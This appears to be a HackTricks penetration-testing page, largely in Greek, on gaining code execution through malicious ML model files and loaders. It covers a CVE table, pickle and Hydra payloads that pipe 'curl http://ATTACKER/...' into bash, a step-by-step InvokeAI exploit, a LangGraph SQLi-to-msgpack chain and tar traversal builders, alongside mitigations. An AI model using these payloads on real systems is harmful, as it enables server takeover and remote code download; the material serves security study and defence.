# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση models σε RCE

Τα Machine Learning models συνήθως μοιράζονται σε διαφορετικές μορφές, όπως ONNX, TensorFlow, PyTorch, κ.λπ. Αυτά τα models μπορούν να φορτωθούν σε developer machines ή production systems για να χρησιμοποιηθούν. Συνήθως τα models δεν θα έπρεπε να περιέχουν malicious code, αλλά υπάρχουν κάποιες περιπτώσεις όπου το model μπορεί να χρησιμοποιηθεί για να εκτελέσει arbitrary code στο σύστημα, είτε ως intended feature είτε λόγω vulnerability στη βιβλιοθήκη φόρτωσης του model.

Τη στιγμή της συγγραφής, αυτά είναι μερικά παραδείγματα αυτού του τύπου vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν κάποια python pickle based models όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security) που μπορούν να χρησιμοποιηθούν για να εκτελέσουν arbitrary code στο σύστημα αν δεν φορτωθούν με `weights_only=True`. Άρα, οποιοδήποτε pickle based model μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτό το είδος attacks, ακόμα κι αν δεν αναφέρεται στον παραπάνω πίνακα.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Κύρια σημεία:
- Ενεργοποιείται πριν από το model initialization στο NeMo `restore_from/from_pretrained`, στους uni2TS HuggingFace coders, και στους FlexTok loaders.
- Η Hydra string block-list μπορεί να παρακαμφθεί μέσω εναλλακτικών import paths (π.χ. `enum.bltns.eval`) ή application-resolved names (π.χ. `nemo.core.classes.common.os.system` → `posix`).
- Το FlexTok επίσης κάνει parse stringified metadata με `ast.literal_eval`, επιτρέποντας DoS (CPU/memory blowup) πριν από το Hydra call.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install` που επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν models από arbitrary URLs.

Εσωτερικά το endpoint τελικά καλεί:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από το user-controlled URL, ένας attacker μπορεί να ενσωματώσει ένα malicious object με ένα custom `__reduce__` method μέσα στο checkpoint· η μέθοδος εκτελείται **κατά τη διάρκεια της deserialization**, οδηγώντας σε **remote code execution (RCE)** στον InvokeAI server.

Το vulnerability αποδόθηκε ως **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Φιλοξένησε το `payload.ckpt` σε έναν HTTP server που ελέγχεις (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποίησε το vulnerable endpoint (δεν απαιτείται authentication):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Όταν το InvokeAI κατεβάζει το αρχείο καλεί `torch.load()` → το `os.system` gadget εκτελείται και ο επιτιθέμενος αποκτά εκτέλεση κώδικα στο context της InvokeAI process.

Έτοιμο exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη ροή.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` reachable by the attacker
•  Process has permissions to execute shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – το patch θέτει `scan=True` by default και εκτελεί malware scanning πριν από το deserialization.
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Θυμήσου ότι οποιοδήποτε Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) είναι εγγενώς unsafe to deserialize από untrusted sources.

---

Παράδειγμα ad-hoc mitigation αν πρέπει να κρατήσεις παλαιότερες InvokeAI versions να τρέχουν πίσω από reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

Το Transformers4Rec της NVIDIA (μέρος του Merlin) εξέθεσε έναν unsafe checkpoint loader που καλούσε απευθείας `torch.load()` σε paths που παρείχε ο χρήστης. Επειδή το `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint που ελέγχεται από attacker μπορεί να εκτελέσει arbitrary code μέσω ενός reducer κατά τη διάρκεια της deserialization.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στο Python pickle, ένα object μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και arguments. Το callable εκτελείται κατά το unpickling. Αν ένα τέτοιο object υπάρχει σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν τα weights.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φόρτωσε το model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το FaceDetection-DSFD της Tencent εκθέτει ένα `resnet` endpoint που deserializes δεδομένα υπό τον έλεγχο του χρήστη. Η ZDI επιβεβαίωσε ότι ένας απομακρυσμένος attacker μπορεί να εξαναγκάσει ένα victim να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα crafted serialized blob σε αυτό το endpoint και να trigger deserialization ως `root`, οδηγώντας σε πλήρη compromise.

Η ροή του exploit μοιάζει με τυπικό pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Οποιοδήποτε gadget είναι προσβάσιμο κατά τη διάρκεια της deserialization (constructors, `__setstate__`, framework callbacks, κ.λπ.) μπορεί να αξιοποιηθεί με τον ίδιο τρόπο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket, ή ένα αρχείο που dropped σε έναν watched directory.



### LangGraph checkpointer SQLi → MessagePack RCE

Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα επειδή ο attacker **δεν χρειάζεται να upload ένα malicious model file**. Αντίθετα, η εφαρμογή εκθέτει ένα **AI-agent persistence API** (`get_state_history(..., filter=...)`) και το user input φτάνει στο checkpointer query builder.

#### 1. Structural SQLi in metadata filters

Ένα vulnerable SQLite pattern έμοιαζε ως εξής:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Η τιμή δένεται αργότερα, αλλά το `query_key` συνενώνεται στο **JSON path string**, οπότε ένα `'` μέσα στο dictionary key βγαίνει από το `'$.{query_key}'` και κάνει inject SQL. Το ίδιο μάθημα ισχύει για **JSON paths, identifiers, operators, `LIMIT`, και TTL fields**: τα placeholders προστατεύουν μόνο values, όχι structural query syntax.

#### 2. `UNION SELECT` μπορεί να στοχεύσει downstream sinks, όχι μόνο data theft

Το query επιστρέφει `type` και serialized `checkpoint` bytes, τα οποία αργότερα καταναλώνονται ως:
```python
self.serde.loads_typed((type, checkpoint))
```
Αυτό σημαίνει ότι ένα SQLi στο `WHERE` clause μπορεί να εισάγει μια **fake result row**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Αν αργότερα ο κώδικας κάνει parse, deserializes, γράφει ή εκτελεί οποιαδήποτε επιλεγμένη στήλη, χαρτογραφήστε αυτές τις στήλες στα sinks τους. Σε αυτή την περίπτωση, η ψεύτικη row μετατρέπει το SQLi σε **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

Το `msgpack` path του LangGraph χρησιμοποιούσε ένα custom extension hook που έκανε unpack ένα nested tuple και εκτελούσε:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Έτσι, ένα MessagePack extension object encoding κάτι ισοδύναμο με `("os", "system", "id > /tmp/pwned")` κάνει import το `os`, επιλύει το `system`, και εκτελεί την εντολή. Όταν εξετάζετε AI frameworks, ελέγξτε τα **custom MessagePack/JSON/pickle revivers** για dynamic imports, reflection, ή arbitrary callable dispatch.

#### 4. Practical audit pattern for agent frameworks

Ελέγξτε οποιοδήποτε user-controlled input που φτάνει σε:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders που παράγουν SQL ή Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths που εμπιστεύονται rows που επιστρέφονται από το persistence layer

Αυτή η συγκεκριμένη chain επηρέασε self-hosted LangGraph deployments που χρησιμοποιούσαν **SQLite** ή **Redis** checkpointers όταν μη έμπιστοι χρήστες μπορούσαν να ελέγξουν το `filter`. Οι patched versions που σημειώθηκαν στη disclosure ήταν `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, και `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Όπως σχολιάζεται σε [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), τα περισσότερα model formats που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε archives, συνήθως `.zip`. Επομένως, μπορεί να είναι δυνατό να καταχραστείτε αυτά τα formats για να πραγματοποιήσετε path traversal attacks, επιτρέποντας την ανάγνωση arbitrary files από το σύστημα όπου φορτώνεται το model.

Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ή, με τον παρακάτω κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργήσει ένα symlink στον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization and gadget hunting

Για έναν εστιασμένο οδηγό σχετικά με τα εσωτερικά του .keras, το Lambda-layer RCE, το arbitrary import issue σε ≤ 3.8, και την ανακάλυψη gadget μετά το fix μέσα στο allowlist, δες:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
